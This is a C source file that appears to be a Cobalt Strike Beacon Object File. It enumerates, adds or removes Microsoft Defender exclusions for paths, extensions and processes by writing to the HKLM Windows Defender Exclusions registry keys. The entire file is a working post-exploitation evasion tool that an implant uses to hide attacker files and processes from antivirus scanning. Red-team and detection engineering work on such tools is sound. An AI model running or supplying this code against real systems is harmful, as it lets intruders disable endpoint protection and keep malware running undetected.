/*
 * defender <enum|add|del> <paths|extensions|processes> [value]
 * - manage Microsoft Defender exclusions via the registry.
 */
#include "beacon.h"
#include "bofdefs.h"
#include "helpers.h"

static const char *subkey(const char *type)
{
    if (bof_stricmp(type, "extensions") == 0)
        return "SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Extensions";
    if (bof_stricmp(type, "processes") == 0)
        return "SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Processes";
    return "SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths";
}

static void list(const char *type)
{
    HKEY h;
    DWORD index;
    LONG rc = ADVAPI32$RegOpenKeyExA(HKEY_LOCAL_MACHINE, subkey(type), 0, KEY_READ, &h);

    if (rc != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "open failed for %s: %ld\n", type, (long)rc);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "Defender %s exclusions\n", type);
    for (index = 0; ; index++) {
        char name[1024];
        DWORD len = sizeof(name);
        rc = ADVAPI32$RegEnumValueA(h, index, name, &len, NULL, NULL, NULL, NULL);
        if (rc == ERROR_NO_MORE_ITEMS) break;
        if (rc != ERROR_SUCCESS) break;
        BeaconPrintf(CALLBACK_OUTPUT, "  %s\n", name);
    }
    ADVAPI32$RegCloseKey(h);
}

void go(char *args, int alen)
{
    datap parser;
    char *op, *type, *value = "";
    int a, b, c;
    HKEY h;
    DWORD zero = 0;
    LONG rc;

    BeaconDataParse(&parser, args, alen);
    op    = BeaconDataExtract(&parser, &a);
    type  = BeaconDataExtract(&parser, &b);
    value = BeaconDataExtract(&parser, &c);
    if (!op || !type) {
        BeaconPrintf(CALLBACK_ERROR, "usage: defender <enum|add|del> <paths|extensions|processes> [value]\n");
        return;
    }

    if (bof_stricmp(op, "enum") == 0) {
        if (type[0]) {
            list(type);
        } else {
            list("paths");
            list("extensions");
            list("processes");
        }
        return;
    }

    if (!value) value = "";
    if (!value[0]) {
        BeaconPrintf(CALLBACK_ERROR, "value required for %s\n", op);
        return;
    }

    rc = ADVAPI32$RegCreateKeyExA(HKEY_LOCAL_MACHINE, subkey(type), 0, NULL, 0,
                                  KEY_SET_VALUE, NULL, &h, NULL);
    if (rc != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "RegCreateKeyEx failed: %ld (run as admin)\n", (long)rc);
        return;
    }

    if (bof_stricmp(op, "add") == 0)
        rc = ADVAPI32$RegSetValueExA(h, value, 0, REG_DWORD, (const BYTE *)&zero, sizeof(zero));
    else
        rc = ADVAPI32$RegDeleteValueA(h, value);

    if (rc == ERROR_SUCCESS)
        BeaconPrintf(CALLBACK_OUTPUT, "%s Defender %s exclusion: %s\n", op, type, value);
    else
        BeaconPrintf(CALLBACK_ERROR, "%s failed: %ld\n", op, (long)rc);

    ADVAPI32$RegCloseKey(h);
}
